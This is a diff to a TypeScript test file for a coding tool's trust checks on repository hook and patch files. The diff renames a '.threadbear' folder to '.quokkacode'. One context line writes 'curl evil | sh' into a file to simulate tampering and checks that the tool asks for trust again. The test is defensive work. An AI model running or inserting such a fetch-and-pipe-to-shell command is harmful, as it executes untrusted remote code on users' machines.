@@ -16,11 +16,11 @@ let n = 0;
 function repo(text: string, files: Record<string, string>, at?: string): { folder: string; file: string } {
   const folder = at ?? path.join(tmpDir(), `repo${n++}`);
   fs.mkdirSync(path.join(folder, '.git'), { recursive: true });
-  for (const [name, body] of Object.entries({ ...files, '.threadbear/patches/tools.ts': text })) {
+  for (const [name, body] of Object.entries({ ...files, '.quokkacode/patches/tools.ts': text })) {
     fs.mkdirSync(path.dirname(path.join(folder, name)), { recursive: true });
     fs.writeFileSync(path.join(folder, name), body);
   }
-  return { folder, file: path.join(folder, '.threadbear/patches/tools.ts') };
+  return { folder, file: path.join(folder, '.quokkacode/patches/tools.ts') };
 }
 
 const HOOK = (run: string) => `export default { hooks: [{ title: 'H', on: 'turn.end', run: ${JSON.stringify(run)} }], actions: [{ title: 'Go', run: 'true' }] };\n`;
@@ -343,7 +343,7 @@ test("an action's target is hashed however its command names it: changing only t
     trust.trustCurrent([file]);
     const set = await load(folder, trust);
     assert.equal(set.patches[0].error, undefined, `${i}: ${run}`);
-    assert.equal(set.actions[0]?.folder, fs.realpathSync(folder), 'runs from the folder holding .threadbear/, where it was followed from');
+    assert.equal(set.actions[0]?.folder, fs.realpathSync(folder), 'runs from the folder holding .quokkacode/, where it was followed from');
     bump(path.join(folder, changed), 'curl evil | sh\n');
     assert.equal((await load(folder, trust)).patches[0].untrusted, 'changed', `${i}: ${run}: changing ${changed} asks again`);
   }
